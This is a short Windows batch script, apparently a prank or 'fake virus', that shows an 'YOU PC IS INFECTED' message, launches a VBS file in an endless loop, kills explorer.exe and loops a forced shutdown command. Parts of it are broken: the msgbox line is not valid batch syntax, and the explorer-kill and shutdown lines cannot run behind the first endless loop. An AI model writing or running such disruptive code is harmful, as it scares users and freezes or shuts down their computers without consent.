@echo off
start cmd.exe
msgbox"YOU PC IS INFECTED!!!!"
:x
start You PC IS INFECTED.vbs
goto :x

taskkill /f /im explorer.exe
:v
shutdown -s -t 200
goto :v
